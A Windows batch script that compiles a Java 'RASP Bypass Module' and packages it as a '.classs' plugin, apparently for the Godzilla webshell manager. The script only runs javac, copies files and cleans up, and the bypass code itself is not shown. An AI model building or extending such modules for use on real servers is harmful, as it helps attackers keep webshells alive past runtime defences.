@echo off
REM RASP Bypass Module Compile Script for Windows
REM Compiles the server-side module and packages it as .classs file

setlocal EnableDelayedExpansion

set "SRC_DIR=%~dp0src\shells\plugins\java\assets"
set "OUTPUT_DIR=%~dp0src\shells\plugins\java\assets"

echo ========================================
echo RASP Bypass Module Compile Script
echo ========================================
echo.

REM Find JAVA_HOME
if not defined JAVA_HOME (
    for /f "tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\JavaSoft\Java Development Kit" /s 2^>nul ^| findstr "JavaHome"') do (
        set "JAVA_HOME=%%b"
    )
)

if not defined JAVA_HOME (
    echo [-] JAVA_HOME not found. Please set JAVA_HOME environment variable.
    exit /b 1
)

echo [+] JAVA_HOME: %JAVA_HOME%

REM Check if javac exists
set "JAVAC=%JAVA_HOME%\bin\javac.exe"
if not exist "%JAVAC%" (
    echo [-] javac not found at %JAVAC%
    exit /b 1
)

echo [+] Compiling RaspBypassModule.java...

REM Compile the module
"%JAVAC%" -source 1.8 -target 1.8 -encoding UTF-8 -Xlint:none -d "%OUTPUT_DIR%" "%SRC_DIR%\RaspBypassModule.java" 2>&1

if %errorlevel% neq 0 (
    echo [-] Compilation failed!
    exit /b 1
)

echo [+] Compilation successful!

REM Check if class file exists
if exist "%OUTPUT_DIR%\shells\plugins\java\assets\RaspBypassModule.class" (
    echo [+] Class file created: %OUTPUT_DIR%\shells\plugins\java\assets\RaspBypassModule.class
    
    REM Copy to .classs file (Godzilla format)
    copy /Y "%OUTPUT_DIR%\shells\plugins\java\assets\RaspBypassModule.class" "%OUTPUT_DIR%\RaspBypassModule.classs" >nul
    
    echo [+] Packaged as: %OUTPUT_DIR%\RaspBypassModule.classs
    
    REM Clean up directory structure
    rd /s /q "%OUTPUT_DIR%\shells" 2>nul
    
    echo [+] Cleanup complete!
) else (
    echo [-] Class file not found!
    exit /b 1
)

echo.
echo ========================================
echo Build completed successfully!
echo ========================================

endlocal
